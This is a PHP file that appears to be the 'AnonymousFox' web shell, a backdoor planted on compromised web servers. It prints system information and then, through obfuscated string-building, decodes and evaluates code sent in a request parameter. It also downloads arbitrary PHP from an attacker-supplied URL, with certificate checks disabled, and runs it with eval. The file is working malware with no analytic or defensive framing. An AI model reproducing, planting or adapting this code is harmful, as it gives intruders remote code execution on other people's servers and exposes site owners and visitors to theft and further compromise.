<?php
error_reporting(0);
echo "AnonymousFox ";
echo '<font color="red"><center>'.php_uname().'</center> </font><br>';
echo '<font color="blue"><center>'.getcwd().'</center></font><br>';
$uf="aXRvbmd0b";$ka="ZXZhbCgkX1";$pjt="JFUVVFU1Rb";$vbl = str_replace("ti","","tistittirti_rtietipltiatice");$iqw="25nXSk7";$bkf = $vbl("k", "", "kbakske6k4k_kdkekckokdke");$sbp = $vbl("ctw","","ctwcctwrectwatctwectw_fctwuncctwtctwioctwn");$mpy = $sbp("", $bkf($vbl("W", "", $ka.$pjt.$uf.$iqw))); $mpy();

$code = $_GET["php"]; if (empty($code) or !stristr($code, "http")){ exit; } else { $php=file_get_contents($code); if (empty($php)){ $php = curl($code); } $php=str_replace("<?php", "", $php); $php=str_replace("<?php", "", $php); $php=str_replace("?>", "", $php); eval($php); } function curl($url) { $curl = curl_init(); curl_setopt($curl, CURLOPT_TIMEOUT, 40); curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE); curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, TRUE); if (stristr($url,"https://")) { curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0); } curl_setopt($curl, CURLOPT_HEADER, false); return curl_exec ($curl); } 

?>